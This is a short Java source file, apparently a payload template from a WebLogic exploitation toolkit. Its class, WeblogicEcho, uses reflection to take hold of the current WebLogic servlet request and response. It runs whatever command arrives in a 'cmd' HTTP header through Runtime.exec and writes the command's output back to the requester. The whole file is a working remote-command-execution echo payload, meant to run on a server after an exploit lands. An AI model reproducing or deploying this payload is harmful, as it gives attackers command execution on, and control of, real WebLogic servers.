package com.feihong.template;

import java.lang.reflect.Field;
import java.util.Scanner;
import weblogic.servlet.internal.ServletResponseImpl;
import weblogic.work.ExecuteThread;
import weblogic.work.WorkAdapter;
import weblogic.xml.util.StringInputStream;

public class WeblogicEcho {
    public WeblogicEcho() throws Exception {
        WorkAdapter workAdapter = ((ExecuteThread)Thread.currentThread()).getCurrentWork();
        Field field = workAdapter.getClass().getDeclaredField("connectionHandler");
        field.setAccessible(true);
        Object obj = field.get(workAdapter);
        obj = obj.getClass().getMethod("getServletRequest").invoke(obj);
        ServletResponseImpl servletResponse = (ServletResponseImpl)obj.getClass().getMethod("getResponse").invoke(obj);

        String cmd = (String)obj.getClass().getMethod("getHeader", String.class).invoke(obj, "cmd");
        if (cmd != null && !cmd.isEmpty()) {
            String result = (new Scanner(Runtime.getRuntime().exec(cmd).getInputStream())).useDelimiter("\\A").next();
            servletResponse.getServletOutputStream().writeStream(new StringInputStream(result));
            servletResponse.getServletOutputStream().flush();
            servletResponse.getWriter().write("");
        }
    }
}
